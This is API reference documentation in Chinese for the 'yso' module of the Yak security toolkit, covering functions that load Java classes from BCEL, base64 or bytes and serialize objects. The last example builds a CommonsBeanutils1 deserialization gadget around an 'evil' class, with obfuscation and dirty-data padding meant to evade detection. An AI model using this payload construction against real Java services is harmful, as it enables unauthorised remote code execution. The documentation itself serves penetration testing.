### LoadClassFromBCEL {#loadclassfrombcel}

```go
LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，

并从这些字节中加载并返回一个javaclassparser.ClassObject对象。

这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。

可通过可变参数`options`来定制类对象的特定属性或行为。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| data | `string` | BCEL 格式的 Java 类数据 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
bcelData := "$$BECL$$..." // 假设的BCEL数据
classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
``````````````

---

### LoadClassFromBase64 {#loadclassfrombase64}

```go
LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| base64 | `string` | 要从中加载类对象的 base64 编码字符串 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
``````````````

---

### LoadClassFromBytes {#loadclassfrombytes}

```go
LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error)
```

从字节数组中加载并返回一个javaclassparser.ClassObject对象。

这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。

这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| bytes | `[]byte` | 要从中加载类对象的字节数组 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| options | `...GenClassOptionFun` | 用于配置类对象的可变参数函数列表 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `*javaclassparser.ClassObject` | 生成的 javaclassparser.ClassObject 对象 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
bytesCode,_ =codec.DecodeBase64("yv66vg...")
classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
``````````````

---

### ToBytes {#tobytes}

```go
ToBytes(i any, opts ...MarshalOptionFun) ([]byte, error)
```

将 Java 或反序列化对象转换为字节码

**必填参数**

|参数名|类型|说明|
|:--|:--|:--|
| i | `any` | Java 类对象或反序列化对象 |

**可选参数**

|参数名|类型|说明|
|:--|:--|:--|
| opts | `...MarshalOptionFun` | 可选的序列化配置项，例如 dirtyDataLength、twoBytesCharString 等 |

**返回值**

|序号|类型|说明|
|:--|:--|:--|
| r1 | `[]byte` | 序列化后的字节码 |
| r2 | `error` | 错误信息，失败时非 nil |

**示例**

``````````````yak
gadgetObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode),yso.obfuscationClassConstantPool(),yso.evilClassName(className),yso.majorVersion(version))
gadgetBytes,_ = yso.ToBytes(gadgetObj,yso.dirtyDataLength(10000),yso.twoBytesCharString())
``````````````

---

